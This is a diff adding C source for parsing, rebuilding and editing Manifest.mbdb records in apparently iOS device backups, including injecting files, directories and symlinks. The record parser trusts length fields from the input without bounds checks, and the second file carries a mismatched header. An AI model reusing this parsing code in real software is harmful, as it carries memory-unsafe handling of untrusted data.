@@ -1,0 +1,6217 @@
+/**
+  * mbdb_record.c
+  * Copyright (C) 2010 Joshua Hill
+  * Copyright (C) 2012 Hanéne Samara
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include "common.h"
+
+mbdb_record_t *mbdb_record_create()
+{
+    mbdb_record_t *record = (mbdb_record_t *) malloc(sizeof(mbdb_record_t));
+    if (record == NULL) {
+        ERROR("Allocation Error!\n");
+        return NULL;
+    }
+    memset(record, '\0', sizeof(mbdb_record_t));
+
+    return record;
+}
+
+mbdb_record_t *mbdb_record_parse(unsigned char *data)
+{
+    unsigned int offset = 0;
+    mbdb_record_t *record = mbdb_record_create();
+    if (record == NULL) {
+        ERROR("Unable to parse mbdb record\n");
+        return NULL;
+    }
+    // Parse Domain
+    unsigned short strsize = be16toh(*((unsigned short *)&data[offset]));
+    if (strsize > 0 && strsize < 0xFFFF) {
+        record->domain = (char *)malloc(strsize + 1);
+        if (record->domain == NULL) {
+            ERROR("Allocation Error!\n");
+            return NULL;
+        }
+        offset += 2;
+        memcpy(record->domain, &data[offset], strsize);
+        record->domain[strsize] = 0;
+        offset += strsize;
+    } else {
+        record->domain = NULL;
+        offset += 2;
+    }
+    record->domain_size = strsize;
+
+    // Parse Path
+    strsize = be16toh(*((unsigned short *)&data[offset]));
+    if (strsize > 0 && strsize < 0xFFFF) {
+        record->path = (char *)malloc(strsize + 1);
+        if (record->path == NULL) {
+            ERROR("Allocation Error!\n");
+            return NULL;
+        }
+        offset += 2;
+        memcpy(record->path, &data[offset], strsize);
+        record->path[strsize] = 0;
+        offset += strsize;
+    } else {
+        record->path = NULL;
+        offset += 2;
+    }
+    record->path_size = strsize;
+
+    // Parse Target
+    strsize = be16toh(*((unsigned short *)&data[offset]));
+    if (strsize > 0 && strsize < 0xFFFF) {
+        record->target = (char *)malloc(strsize + 1);
+        if (record->target == NULL) {
+            ERROR("Allocation Error!\n");
+            return NULL;
+        }
+        offset += 2;
+        memcpy(record->target, &data[offset], strsize);
+        record->target[strsize] = 0;
+        offset += strsize;
+    } else {
+        record->target = NULL;
+        offset += 2;
+    }
+    record->target_size = strsize;
+
+    // parse DataHash
+    strsize = be16toh(*((unsigned short *)&data[offset]));
+    if (strsize > 0 && strsize < 0xFFFF) {
+        record->datahash = (char *)malloc(strsize);
+        if (record->datahash == NULL) {
+            ERROR("Allocation Error!\n");
+            return NULL;
+        }
+        offset += 2;
+        memcpy(record->datahash, &data[offset], strsize);
+        offset += strsize;
+    } else {
+        record->datahash = NULL;
+        offset += 2;
+    }
+    record->datahash_size = strsize;
+
+    // parse unknown1
+    strsize = be16toh(*((unsigned short *)&data[offset]));
+    if (strsize > 0 && strsize < 0xFFFF) {
+        record->unknown1 = (char *)malloc(strsize + 1);
+        if (record->unknown1 == NULL) {
+            ERROR("Allocation Error!\n");
+            return NULL;
+        }
+        offset += 2;
+        memcpy(record->unknown1, &data[offset], strsize);
+        record->unknown1[strsize] = 0;
+        offset += strsize;
+    } else {
+        record->unknown1 = NULL;
+        offset += 2;
+    }
+    record->unknown1_size = strsize;
+
+    record->mode = be16toh(*((unsigned short *)&data[offset]));
+    offset += 2;
+
+    record->unknown2 = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->inode = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->uid = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->gid = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->time1 = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->time2 = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->time3 = be32toh(*((unsigned int *)&data[offset]));
+    offset += 4;
+
+    record->length = be64toh(*((unsigned long long *)&data[offset]));
+    offset += 8;
+
+    record->flag = *((unsigned char *)&data[offset]);
+    offset += 1;
+
+    record->property_count = *((unsigned char *)&data[offset]);
+    offset += 1;
+
+    if (record->property_count > 0) {
+        record->properties =
+            (mbdb_record_property_t **) malloc(sizeof(mbdb_record_property_t *)
+                                               * record->property_count);
+        int i;
+        for (i = 0; i < record->property_count; i++) {
+            mbdb_record_property_t *prop =
+                malloc(sizeof(mbdb_record_property_t));
+            prop->name_size = be16toh(*((unsigned short *)&data[offset]));
+            prop->name = (char *)malloc(prop->name_size + 1);
+            offset += 2;
+            memcpy(prop->name, &data[offset], prop->name_size);
+            prop->name[prop->name_size] = 0;
+            offset += prop->name_size;
+
+            prop->value_size = be16toh(*((unsigned short *)&data[offset]));
+            prop->value = (char *)malloc(prop->value_size + 1);
+            offset += 2;
+            memcpy(prop->value, &data[offset], prop->value_size);
+            prop->value[prop->value_size] = 0;
+            offset += prop->value_size;
+
+            record->properties[i] = prop;
+        }
+    }
+    record->this_size = offset;
+
+    //mbdb_record_debug(record);
+
+    return record;
+}
+
+/*
+ struct mbdb_record_t {
+ char* domain;
+ char* path;
+ char* target;	                  // absolute path
+ char* datahash;	                  // SHA1 hash
+ char* unknown1;
+ unsigned short mode;	          // Axxx = symlink, 4xxx = dir, 8xxx = file
+ unsigned int unknown2;
+ unsigned int inode;
+ unsigned int uid;
+ unsigned int gid;
+ unsigned int time1;
+ unsigned int time2;
+ unsigned int time3;
+ unsigned long long length;	      // 0 if link or dir
+ unsigned char flag;	              // 0 if link or dir
+ unsigned char properties;	      // number of properties
+ } __attribute__((__packed__));
+ */
+
+void mbdb_record_free(mbdb_record_t * record)
+{
+    if (record) {
+        if (record->domain) {
+            free(record->domain);
+        }
+        if (record->path) {
+            free(record->path);
+        }
+        if (record->target) {
+            free(record->target);
+        }
+        if (record->datahash) {
+            free(record->datahash);
+        }
+        if (record->unknown1) {
+            free(record->unknown1);
+        }
+        if (record->property_count > 0) {
+            int i;
+            for (i = 0; i < record->property_count; i++) {
+                if (record->properties[i]->name) {
+                    free(record->properties[i]->name);
+                }
+                if (record->properties[i]->value) {
+                    free(record->properties[i]->value);
+                }
+                free(record->properties[i]);
+            }
+            free(record->properties);
+        }
+        free(record);
+    }
+}
+
+void mbdb_record_debug(mbdb_record_t * record)
+{
+    DEBUG("mbdb record\n");
+    DEBUG("\tdomain = %s\n", record->domain);
+    DEBUG("\tpath = %s\n", record->path);
+    DEBUG("\ttarget = %s\n", record->target);
+    DEBUG("\tdatahash = %p\n", record->datahash);
+    DEBUG("\tunknown1 = %s\n", record->unknown1);
+    DEBUG("\tmode = 0%o (0x%x)\n", record->mode, record->mode);
+    DEBUG("\tunknown2 = 0x%x\n", record->unknown2);
+    DEBUG("\tinode = 0x%x\n", record->inode);
+    DEBUG("\tuid = %d\n", record->uid);
+    DEBUG("\tgid = %d\n", record->gid);
+    DEBUG("\ttime1 = 0x%x\n", record->time1);
+    DEBUG("\ttime2 = 0x%x\n", record->time2);
+    DEBUG("\ttime3 = 0x%x\n", record->time3);
+    DEBUG("\tlength = %llu\n", record->length);
+    DEBUG("\tflag = 0x%x\n", record->flag);
+    DEBUG("\tproperty_count = %d\n", record->property_count);
+}
+
+void mbdb_record_init(mbdb_record_t * record)
+{
+    if (!record) {
+        return;
+    }
+    memset(record, '\0', sizeof(mbdb_record_t));
+    record->target_size = 0xFFFF;
+    record->datahash_size = 0xFFFF;
+    record->unknown1_size = 0xFFFF;
+    record->this_size =
+        2 + 2 + 2 + 2 + 2 + 2 + 4 + 4 + 4 + 4 + 4 + 4 + 4 + 8 + 1 + 1;
+}
+
+void mbdb_record_set_domain(mbdb_record_t * record, const char *domain)
+{
+    if (!record)
+        return;
+    unsigned short old_size = record->domain_size;
+    if (record->domain) {
+        free(record->domain);
+        record->domain = NULL;
+    }
+    if (record->domain_size > 0 && record->domain_size < 0xFFFF) {
+        record->this_size -= record->domain_size;
+    }
+    if (domain && (strlen(domain) > 0)) {
+        record->domain_size = strlen(domain);
+        record->domain = strdup(domain);
+        record->this_size += record->domain_size;
+    } else {
+        record->domain_size = 0;
+    }
+}
+
+void mbdb_record_set_path(mbdb_record_t * record, const char *path)
+{
+    if (!record)
+        return;
+    unsigned short old_size = record->path_size;
+    if (record->path) {
+        free(record->path);
+        record->path = NULL;
+    }
+    if (record->path_size > 0 && record->path_size < 0xFFFF) {
+        record->this_size -= record->path_size;
+    }
+    if (path && (strlen(path) > 0)) {
+        record->path_size = strlen(path);
+        record->path = strdup(path);
+        record->this_size += record->path_size;
+    } else {
+        record->path_size = 0;
+    }
+}
+
+void mbdb_record_set_target(mbdb_record_t * record, const char *target)
+{
+    if (!record)
+        return;
+    unsigned short old_size = record->target_size;
+    if (record->target) {
+        free(record->target);
+        record->target = NULL;
+    }
+    if (record->target_size > 0 && record->target_size < 0xFFFF) {
+        record->this_size -= record->target_size;
+    }
+    if (target && (strlen(target) > 0)) {
+        record->target_size = strlen(target);
+        record->target = strdup(target);
+        record->this_size += record->target_size;
+    } else {
+        record->target_size = 0xFFFF;
+    }
+}
+
+void mbdb_record_set_datahash(mbdb_record_t * record, const char *hash,
+                              unsigned short hash_size)
+{
+    if (!record)
+        return;
+    unsigned short old_size = record->datahash_size;
+    if (record->datahash) {
+        free(record->datahash);
+        record->datahash = NULL;
+    }
+    if (record->datahash_size > 0 && record->datahash_size < 0xFFFF) {
+        record->this_size -= record->datahash_size;
+    }
+    if (hash && (hash_size > 0)) {
+        record->datahash_size = hash_size;
+        record->datahash = (char *)malloc(hash_size);
+        memcpy(record->datahash, hash, hash_size);
+        record->this_size += record->datahash_size;
+    } else {
+        record->datahash_size = 0xFFFF;
+    }
+}
+
+void mbdb_record_set_unknown1(mbdb_record_t * record, const char *data,
+                              unsigned short size)
+{
+    if (!record)
+        return;
+    unsigned short old_size = record->unknown1_size;
+    if (record->unknown1) {
+        free(record->unknown1);
+        record->unknown1 = NULL;
+    }
+    if (record->unknown1_size > 0 && record->unknown1_size < 0xFFFF) {
+        record->this_size -= record->unknown1_size;
+    }
+    if (data && (size > 0)) {
+        record->unknown1_size = size;
+        record->unknown1 = (char *)malloc(size);
+        memcpy(record->unknown1, data, size);
+        record->this_size += record->unknown1_size;
+    } else {
+        record->unknown1_size = 0xFFFF;
+    }
+}
+
+void mbdb_record_set_mode(mbdb_record_t * record, unsigned short mode)
+{
+    if (!record)
+        return;
+    record->mode = mode;
+}
+
+void mbdb_record_set_unknown2(mbdb_record_t * record, unsigned int unknown2)
+{
+    if (!record)
+        return;
+    record->unknown2 = unknown2;
+}
+
+void mbdb_record_set_inode(mbdb_record_t * record, unsigned int inode)
+{
+    if (!record)
+        return;
+    record->inode = inode;
+}
+
+void mbdb_record_set_uid(mbdb_record_t * record, unsigned int uid)
+{
+    if (!record)
+        return;
+    record->uid = uid;
+}
+
+void mbdb_record_set_gid(mbdb_record_t * record, unsigned int gid)
+{
+    if (!record)
+        return;
+    record->gid = gid;
+}
+
+void mbdb_record_set_time1(mbdb_record_t * record, unsigned int time1)
+{
+    if (!record)
+        return;
+    record->time1 = time1;
+}
+
+void mbdb_record_set_time2(mbdb_record_t * record, unsigned int time2)
+{
+    if (!record)
+        return;
+    record->time2 = time2;
+}
+
+void mbdb_record_set_time3(mbdb_record_t * record, unsigned int time3)
+{
+    if (!record)
+        return;
+    record->time3 = time3;
+}
+
+void mbdb_record_set_length(mbdb_record_t * record, unsigned long long length)
+{
+    if (!record)
+        return;
+    record->length = length;
+}
+
+void mbdb_record_set_flag(mbdb_record_t * record, unsigned char flag)
+{
+    if (!record)
+        return;
+    record->flag = flag;
+}
+
+int mbdb_record_build(mbdb_record_t * record, unsigned char **data,
+                      unsigned int *size)
+{
+    unsigned int offset = 0;
+    unsigned char *data_buf = NULL;
+
+    if (!record) {
+        return -1;
+    }
+
+    data_buf = (unsigned char *)malloc(record->this_size);
+    if (!data_buf) {
+        ERROR("Allocation Error!\n");
+        return -1;
+    }
+
+    unsigned short strsize;
+
+    // append Domain
+    strsize = htobe16(record->domain_size);
+    memcpy(&data_buf[offset], &strsize, 2);
+    offset += 2;
+    if (record->domain != NULL) {
+        memcpy(&data_buf[offset], record->domain, record->domain_size);
+        offset += record->domain_size;
+    }
+    // append Path
+    strsize = htobe16(record->path_size);
+    memcpy(&data_buf[offset], &strsize, 2);
+    offset += 2;
+    if (record->path != NULL) {
+        memcpy(&data_buf[offset], record->path, record->path_size);
+        offset += record->path_size;
+    }
+    // append Target
+    strsize = htobe16(record->target_size);
+    memcpy(&data_buf[offset], &strsize, 2);
+    offset += 2;
+    if (record->target != NULL) {
+        memcpy(&data_buf[offset], record->target, record->target_size);
+        offset += record->target_size;
+    }
+    // append DataHash
+    strsize = htobe16(record->datahash_size);
+    memcpy(&data_buf[offset], &strsize, 2);
+    offset += 2;
+    if (record->datahash != NULL) {
+        memcpy(&data_buf[offset], record->datahash, record->datahash_size);
+        offset += record->datahash_size;
+    }
+    // append unknown1
+    strsize = htobe16(record->unknown1_size);
+    memcpy(&data_buf[offset], &strsize, 2);
+    offset += 2;
+    if (record->unknown1 != NULL) {
+        memcpy(&data_buf[offset], record->unknown1, record->unknown1_size);
+        offset += record->unknown1_size;
+    }
+
+    unsigned short mode = htobe16(record->mode);
+    memcpy(&data_buf[offset], &mode, 2);
+    offset += 2;
+
+    int unknown2 = htobe32(record->unknown2);
+    memcpy(&data_buf[offset], &unknown2, 4);
+    offset += 4;
+
+    int inode = htobe32(record->inode);
+    memcpy(&data_buf[offset], &inode, 4);
+    offset += 4;
+
+    int uid = htobe32(record->uid);
+    memcpy(&data_buf[offset], &uid, 4);
+    offset += 4;
+
+    int gid = htobe32(record->gid);
+    memcpy(&data_buf[offset], &gid, 4);
+    offset += 4;
+
+    int time1 = htobe32(record->time1);
+    memcpy(&data_buf[offset], &time1, 4);
+    offset += 4;
+
+    int time2 = htobe32(record->time2);
+    memcpy(&data_buf[offset], &time2, 4);
+    offset += 4;
+
+    int time3 = htobe32(record->time3);
+    memcpy(&data_buf[offset], &time3, 4);
+    offset += 4;
+
+    unsigned long long length = htobe64(record->length);
+    memcpy(&data_buf[offset], &length, 8);
+    offset += 8;
+
+    unsigned char flag = record->flag;
+    memcpy(&data_buf[offset], &flag, 1);
+    offset++;
+
+    unsigned char prop = record->property_count;
+    memcpy(&data_buf[offset], &prop, 1);
+    offset++;
+
+    // add properties
+    int i;
+    for (i = 0; i < (int)prop; i++) {
+        mbdb_record_property_t *property = record->properties[i];
+
+        unsigned short pnsize = htobe16(property->name_size);
+        memcpy(&data_buf[offset], &pnsize, 2);
+        offset += 2;
+        memcpy(&data_buf[offset], property->name, property->name_size);
+        offset += property->name_size;
+
+        unsigned short pvsize = htobe16(property->value_size);
+        memcpy(&data_buf[offset], &pvsize, 2);
+        offset += 2;
+        memcpy(&data_buf[offset], property->value, property->value_size);
+        offset += property->value_size;
+    }
+
+    if (record->this_size != offset) {
+        *data = NULL;
+        *size = 0;
+        ERROR
+            ("%s: ERROR: inconsistent record size (present %d != created %d)\n",
+             __func__, record->this_size, offset);
+        return -1;
+    }
+
+    *data = data_buf;
+    *size = offset;
+
+    return 0;
+}
+/**
+  * mbdb_record.c
+  * Copyright (C) 2010 Joshua Hill
+  * Copyright (C) 2012 Hanéne Samara
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include "common.h"
+
+backup_t *backup_open(const char *backupdir, const char *uuid)
+{
+    if (!backupdir || !uuid) {
+        return NULL;
+    }
+
+    char *backup_path =
+        (char *)malloc(strlen(backupdir) + 1 + strlen(uuid) + 1 + 4);
+    strcpy(backup_path, backupdir);
+    strcat(backup_path, "/");
+    strcat(backup_path, uuid);
+
+    char *mbdb_path =
+        (char *)malloc(strlen(backup_path) + 1 + strlen("Manifest.mbdb") + 1 +
+                       4);
+    strcpy(mbdb_path, backup_path);
+    strcat(mbdb_path, "/");
+    strcat(mbdb_path, "Manifest.mbdb");
+
+    mbdb_t *mbdb = mbdb_open(mbdb_path);
+    if (mbdb) {
+        DEBUG("Manifest.mbdb opened, %d records\n", mbdb->num_records);
+    } else {
+        ERROR("ERROR: could not open %s\n", mbdb_path);
+        free(mbdb_path);
+        return NULL;
+    }
+    free(mbdb_path);
+
+    backup_t *backup = (backup_t *) malloc(sizeof(backup_t));
+    if (backup == NULL) {
+        free(mbdb);
+        return NULL;
+    }
+    memset(backup, '\0', sizeof(backup_t));
+
+    backup->mbdb = mbdb;
+    backup->path = backup_path;
+
+    return backup;
+}
+
+int backup_get_file_index(backup_t * backup, const char *domain,
+                          const char *path)
+{
+    if (!backup || !backup->mbdb) {
+        return -1;
+    }
+    int i = 0;
+    int found = 0;
+    mbdb_record_t *rec = NULL;
+    for (i = 0; i < backup->mbdb->num_records; i++) {
+        rec = backup->mbdb->records[i];
+        if (rec->domain && !strcmp(rec->domain, domain) && rec->path
+            && !strcmp(rec->path, path)) {
+            found = 1;
+            break;
+        }
+    }
+    return (found) ? i : -1;
+}
+
+backup_file_t *backup_get_file(backup_t * backup, const char *domain,
+                               const char *path)
+{
+    if (!backup || !backup->mbdb) {
+        return NULL;
+    }
+    int idx = backup_get_file_index(backup, domain, path);
+    if (idx < 0) {
+        // not found
+        return NULL;
+    }
+    mbdb_record_t *rec = backup->mbdb->records[idx];
+    return backup_file_create_from_record(rec);
+}
+
+char *backup_get_file_path(backup_t * backup, backup_file_t * bfile)
+{
+    int res = 0;
+
+    if (!backup || !bfile) {
+        return NULL;
+    }
+    if (!backup->mbdb) {
+        ERROR("%s: ERROR: no mbdb in given backup_t\n", __func__);
+        return NULL;
+    }
+
+    char *bfntmp =
+        (char *)malloc(bfile->mbdb_record->domain_size + 1 +
+                       bfile->mbdb_record->path_size + 1 + 4);
+    strcpy(bfntmp, bfile->mbdb_record->domain);
+    strcat(bfntmp, "-");
+    strcat(bfntmp, bfile->mbdb_record->path);
+
+    char *backupfname = (char *)malloc(strlen(backup->path) + 1 + 40 + 1);
+    unsigned char sha1[20] = { 0, };
+    SHA1(bfntmp, strlen(bfntmp), sha1);
+    free(bfntmp);
+
+    strcpy(backupfname, backup->path);
+    strcat(backupfname, "/");
+
+    int i;
+    char *p = backupfname + strlen(backup->path) + 1;
+    for (i = 0; i < 20; i++) {
+        sprintf(p + i * 2, "%02x", sha1[i]);
+    }
+
+    DEBUG("backup filename is %s\n", backupfname);
+
+    return backupfname;
+}
+
+int backup_update_file(backup_t * backup, backup_file_t * bfile)
+{
+    int res = 0;
+
+    if (!backup || !bfile) {
+        return -1;
+    }
+    if (!backup->mbdb) {
+        ERROR("%s: ERROR: no mbdb in given backup_t\n", __func__);
+        return -1;
+    }
+
+    unsigned char *rec = NULL;
+    unsigned int rec_size = 0;
+
+    if (backup_file_get_record_data(bfile, &rec, &rec_size) < 0) {
+        ERROR("%s: ERROR: could not build mbdb_record data\n", __func__);
+        return -1;
+    }
+
+    unsigned int newsize = 0;
+    unsigned char *newdata = NULL;
+
+    // find record
+    int idx =
+        backup_get_file_index(backup, bfile->mbdb_record->domain,
+                              bfile->mbdb_record->path);
+    if (idx < 0) {
+        // append record to mbdb
+        newsize = backup->mbdb->size + rec_size;
+        newdata = (unsigned char *)malloc(newsize);
+
+        memcpy(newdata, backup->mbdb->data, backup->mbdb->size);
+        memcpy(newdata + backup->mbdb->size, rec, rec_size);
+    } else {
+        // update record in mbdb
+        backup_file_t *oldfile =
+            backup_file_create_from_record(backup->mbdb->records[idx]);
+        unsigned int oldsize = oldfile->mbdb_record->this_size;
+        backup_file_free(oldfile);
+
+        newsize = backup->mbdb->size - oldsize + rec_size;
+        newdata = (unsigned char *)malloc(newsize);
+
+        char *p = newdata;
+        memcpy(p, backup->mbdb->data, sizeof(mbdb_header_t));
+        p += sizeof(mbdb_header_t);
+
+        mbdb_record_t *r;
+        unsigned char *rd;
+        unsigned int rs;
+        int i;
+
+        for (i = 0; i < idx; i++) {
+            r = backup->mbdb->records[i];
+            rd = NULL;
+            rs = 0;
+            mbdb_record_build(r, &rd, &rs);
+            memcpy(p, rd, rs);
+            free(rd);
+            p += rs;
+        }
+        memcpy(p, rec, rec_size);
+        p += rec_size;
+        for (i = idx + 1; i < backup->mbdb->num_records; i++) {
+            r = backup->mbdb->records[i];
+            rd = NULL;
+            rs = 0;
+            mbdb_record_build(r, &rd, &rs);
+            memcpy(p, rd, rs);
+            free(rd);
+            p += rs;
+        }
+    }
+
+    if (!newdata) {
+        ERROR("Uh, could not re-create mbdb data?!\n");
+        return -1;
+    }
+
+    mbdb_free(backup->mbdb);
+    free(rec);
+
+    // parse the new data
+    backup->mbdb = mbdb_parse(newdata, newsize);
+    free(newdata);
+
+    // write out the file data
+    char *bfntmp =
+        (char *)malloc(bfile->mbdb_record->domain_size + 1 +
+                       bfile->mbdb_record->path_size + 1 + 4);
+    strcpy(bfntmp, bfile->mbdb_record->domain);
+    strcat(bfntmp, "-");
+    strcat(bfntmp, bfile->mbdb_record->path);
+
+    char *backupfname = (char *)malloc(strlen(backup->path) + 1 + 40 + 1);
+    unsigned char sha1[20] = { 0, };
+    SHA1(bfntmp, strlen(bfntmp), sha1);
+    free(bfntmp);
+
+    strcpy(backupfname, backup->path);
+    strcat(backupfname, "/");
+
+    int i;
+    char *p = backupfname + strlen(backup->path) + 1;
+    for (i = 0; i < 20; i++) {
+        sprintf(p + i * 2, "%02x", sha1[i]);
+    }
+
+    DEBUG("backup filename is %s\n", backupfname);
+
+    if (bfile->filepath) {
+        // copy file to backup dir
+        if (file_copy(bfile->filepath, backupfname) < 0) {
+            ERROR("%s: ERROR: could not copy file '%s' to '%s'\n", __func__,
+                  bfile->filepath, backupfname);
+            res = -1;
+        }
+    } else if (bfile->data) {
+        // write data buffer to file
+        if (file_write(backupfname, bfile->data, bfile->size) < 0) {
+            ERROR("%s: ERROR: could not write to '%s'\n", __func__,
+                  backupfname);
+            res = -1;
+        }
+    } else if ((bfile->mbdb_record->mode) & 040000) {
+        // directory!
+    } else {
+        DEBUG("%s: WARNING: file data not updated, no filename or data given\n",
+              __func__);
+    }
+
+    free(backupfname);
+
+    return res;
+}
+
+int backup_remove_file(backup_t * backup, backup_file_t * bfile)
+{
+    int res = 0;
+
+    if (!backup || !bfile) {
+        return -1;
+    }
+    if (!backup->mbdb) {
+        ERROR("%s: ERROR: no mbdb in given backup_t\n", __func__);
+        return -1;
+    }
+
+    unsigned int newsize = 0;
+    unsigned char *newdata = NULL;
+
+    // find record
+    int idx =
+        backup_get_file_index(backup, bfile->mbdb_record->domain,
+                              bfile->mbdb_record->path);
+    if (idx < 0) {
+        DEBUG("file %s-%s not found in backup so not removed.\n",
+              bfile->mbdb_record->domain, bfile->mbdb_record->path);
+        return -1;
+    } else {
+        // remove record from mbdb
+        backup_file_t *oldfile =
+            backup_file_create_from_record(backup->mbdb->records[idx]);
+        unsigned int oldsize = oldfile->mbdb_record->this_size;
+        backup_file_free(oldfile);
+
+        newsize = backup->mbdb->size - oldsize;
+        newdata = (unsigned char *)malloc(newsize);
+
+        char *p = newdata;
+        memcpy(p, backup->mbdb->data, sizeof(mbdb_header_t));
+        p += sizeof(mbdb_header_t);
+
+        mbdb_record_t *r;
+        unsigned char *rd;
+        unsigned int rs;
+        int i;
+
+        for (i = 0; i < idx; i++) {
+            r = backup->mbdb->records[i];
+            rd = NULL;
+            rs = 0;
+            mbdb_record_build(r, &rd, &rs);
+            memcpy(p, rd, rs);
+            free(rd);
+            p += rs;
+        }
+        for (i = idx + 1; i < backup->mbdb->num_records; i++) {
+            r = backup->mbdb->records[i];
+            rd = NULL;
+            rs = 0;
+            mbdb_record_build(r, &rd, &rs);
+            memcpy(p, rd, rs);
+            free(rd);
+            p += rs;
+        }
+    }
+
+    if (!newdata) {
+        ERROR("Uh, could not re-create mbdb data?!\n");
+        return -1;
+    }
+
+    mbdb_free(backup->mbdb);
+
+    // parse the new data
+    backup->mbdb = mbdb_parse(newdata, newsize);
+    free(newdata);
+
+    // write out the file data
+    char *bfntmp =
+        (char *)malloc(bfile->mbdb_record->domain_size + 1 +
+                       bfile->mbdb_record->path_size + 1 + 4);
+    strcpy(bfntmp, bfile->mbdb_record->domain);
+    strcat(bfntmp, "-");
+    strcat(bfntmp, bfile->mbdb_record->path);
+
+    char *backupfname = (char *)malloc(strlen(backup->path) + 1 + 40 + 1);
+    unsigned char sha1[20] = { 0, };
+    SHA1(bfntmp, strlen(bfntmp), sha1);
+    free(bfntmp);
+
+    strcpy(backupfname, backup->path);
+    strcat(backupfname, "/");
+
+    int i;
+    char *p = backupfname + strlen(backup->path) + 1;
+    for (i = 0; i < 20; i++) {
+        sprintf(p + i * 2, "%02x", sha1[i]);
+    }
+
+    if (!(bfile->mbdb_record->mode & 040000)) {
+        DEBUG("deleting file %s\n", backupfname);
+        remove(backupfname);
+    }
+
+    free(backupfname);
+
+    return res;
+}
+
+int backup_write_mbdb(backup_t * backup)
+{
+    if (!backup || !backup->path || !backup->mbdb) {
+        return -1;
+    }
+
+    char *mbdb_path =
+        (char *)malloc(strlen(backup->path) + 1 + strlen("Manifest.mbdb") + 1);
+    strcpy(mbdb_path, backup->path);
+    strcat(mbdb_path, "/");
+    strcat(mbdb_path, "Manifest.mbdb");
+
+    int res = file_write(mbdb_path, backup->mbdb->data, backup->mbdb->size);
+    free(mbdb_path);
+    return res;
+}
+
+void backup_free(backup_t * backup)
+{
+    if (backup) {
+        if (backup->mbdb) {
+            mbdb_free(backup->mbdb);
+        }
+        if (backup->path) {
+            free(backup->path);
+        }
+        free(backup);
+    }
+}
+
+int inode_start = 54327;        /* Whatever. */
+
+int backup_mkdir(backup_t * backup, char *domain, char *path, int mode, int uid,
+                 int gid, int flag)
+{
+    int ret = -1;
+    backup_file_t *file = backup_file_create(NULL);
+
+    DEBUG("[backup] MKDIR: (%s):%s\n", domain, path);
+
+    if (file) {
+        backup_file_set_domain(file, domain);
+        backup_file_set_path(file, path);
+        backup_file_set_mode(file, mode | 040000);
+        inode_start++;
+
+        backup_file_set_inode(file, inode_start);
+        backup_file_set_uid(file, uid);
+        backup_file_set_gid(file, gid);
+        backup_file_set_time1(file, time(NULL));
+        backup_file_set_time2(file, time(NULL));
+        backup_file_set_time3(file, time(NULL));
+        backup_file_set_flag(file, flag);
+
+        if (backup_update_file(backup, file) >= 0)
+            ret = 0;
+        else
+            ret = -1;
+        backup_file_free(file);
+
+        if (!ret)
+            backup_write_mbdb(backup);
+    }
+    return ret;
+}
+
+int backup_symlink(backup_t * backup, char *domain, char *path, char *to,
+                   int uid, int gid, int flag)
+{
+    int ret = -1;
+    backup_file_t *file = backup_file_create(NULL);
+
+    DEBUG("[backup] SYMLINK: (%s):%s => %s\n", domain, path, to);
+
+    if (file) {
+        backup_file_set_domain(file, domain);
+        backup_file_set_path(file, path);
+        backup_file_set_target(file, to);
+        backup_file_set_mode(file, 0120644);
+        inode_start++;
+
+        backup_file_set_inode(file, inode_start);
+        backup_file_set_uid(file, uid);
+        backup_file_set_gid(file, gid);
+        backup_file_set_time1(file, time(NULL));
+        backup_file_set_time2(file, time(NULL));
+        backup_file_set_time3(file, time(NULL));
+        backup_file_set_flag(file, flag);
+
+        if (backup_update_file(backup, file) >= 0)
+            ret = 0;
+        else
+            ret = -1;
+        backup_file_free(file);
+
+        if (!ret)
+            backup_write_mbdb(backup);
+    }
+    return ret;
+}
+
+int backup_add_file_from_path(backup_t * backup, char *domain, char *localpath,
+                              char *path, int mode, int uid, int gid, int flag)
+{
+    int ret = -1;
+    unsigned int size = 0;
+    unsigned char *data = NULL;
+    struct stat buf;
+
+    if (stat(localpath, &buf) == -1)
+        ERROR("Could not open %s\n", localpath);
+
+    file_read(localpath, &data, &size);
+
+    DEBUG("[backup] FILE: (%s):%s\n", domain, path);
+
+    backup_file_t *file = backup_file_create_with_data(data, size, 0);
+
+    if (file) {
+        backup_file_set_domain(file, domain);
+        backup_file_set_path(file, path);
+        backup_file_set_mode(file, mode | 0100000);
+        inode_start++;
+
+        backup_file_set_inode(file, inode_start);
+        backup_file_set_uid(file, uid);
+        backup_file_set_gid(file, gid);
+        backup_file_set_time1(file, time(NULL));
+        backup_file_set_time2(file, time(NULL));
+        backup_file_set_time3(file, time(NULL));
+        backup_file_set_flag(file, flag);
+
+        backup_file_set_length(file, size);
+
+        if (backup_update_file(backup, file) >= 0)
+            ret = 0;
+        else
+            ret = -1;
+        backup_file_free(file);
+
+        if (!ret)
+            backup_write_mbdb(backup);
+    }
+    return ret;
+}
+
+int backup_add_file_from_data(backup_t * backup, char *domain, char *data,
+                              unsigned int size, char *path, int mode, int uid,
+                              int gid, int flag)
+{
+    int ret = -1;
+    backup_file_t *file = backup_file_create_with_data(data, size, 0);
+
+    if (file) {
+        backup_file_set_domain(file, domain);
+        backup_file_set_path(file, path);
+        backup_file_set_mode(file, mode | 0100000);
+        inode_start++;
+
+        backup_file_set_inode(file, inode_start);
